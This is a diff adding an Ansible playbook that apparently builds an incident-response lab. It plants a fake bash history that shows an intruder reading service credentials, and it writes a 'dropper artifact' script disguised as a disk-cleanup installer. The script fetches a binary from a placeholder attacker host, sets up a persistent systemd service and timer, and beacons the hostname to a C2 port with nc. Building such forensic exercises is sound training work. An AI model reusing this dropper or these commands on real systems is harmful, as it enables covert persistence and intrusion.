@@ -1,0 +1,80 @@
+---
+- name: Plant bash_history showing initial compromise and trigger
+  copy:
+    dest: "/home/{{ username }}/.bash_history"
+    owner: "{{ username }}"
+    group: "{{ username }}"
+    mode: "0600"
+    content: |
+      ssh cyrano@workstation
+      id
+      sudo -l
+      df -h
+      ls /data/company_files/
+      ls /data/company_files/admin/
+      cat /data/company_files/admin/service_credentials.txt
+      cd /tmp
+      curl -sL http://{{ attacker_ip }}/disk-cleanup-installer.sh -o disk-cleanup-installer.sh
+      chmod +x disk-cleanup-installer.sh
+      sudo ./disk-cleanup-installer.sh
+      sudo systemctl enable disk-maintenance.service
+      sudo systemctl enable disk-maintenance.timer
+      sudo systemctl start disk-maintenance.service
+      ls /data/company_files/
+      exit
+
+- name: Create dropper artifact script
+  copy:
+    dest: "{{ dropper_path }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # disk-cleanup-installer — storage maintenance suite v1.4
+
+      BINARY_URL="http://{{ attacker_ip }}/disk-maintenance"
+      INSTALL_PATH="/usr/local/sbin/disk-maintenance"
+      SERVICE_NAME="disk-maintenance"
+      C2_HOST="{{ attacker_ip }}"
+      C2_PORT="4444"
+
+      echo "[*] Installing disk maintenance suite..."
+
+      curl -sL "$BINARY_URL" -o "$INSTALL_PATH" 2>/dev/null || \
+          wget -q "$BINARY_URL" -O "$INSTALL_PATH" 2>/dev/null
+
+      chmod 755 "$INSTALL_PATH"
+
+      cat > /etc/systemd/system/${SERVICE_NAME}.service << 'EOF'
+      [Unit]
+      Description=Disk Maintenance Service
+      After=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart=/usr/local/sbin/disk-maintenance
+      RemainAfterExit=yes
+
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+
+      cat > /etc/systemd/system/${SERVICE_NAME}.timer << 'EOF'
+      [Unit]
+      Description=Disk Maintenance Timer
+
+      [Timer]
+      OnBootSec=5min
+
+      [Install]
+      WantedBy=timers.target
+      EOF
+
+      systemctl daemon-reload
+      systemctl enable "$SERVICE_NAME.service"
+      systemctl enable "$SERVICE_NAME.timer"
+
+      printf "TRIGGER host=%s\n" "$(hostname)" | nc -w 5 "$C2_HOST" "$C2_PORT" 2>/dev/null || true
+
+      echo "[+] Installation complete. Maintenance scheduled."
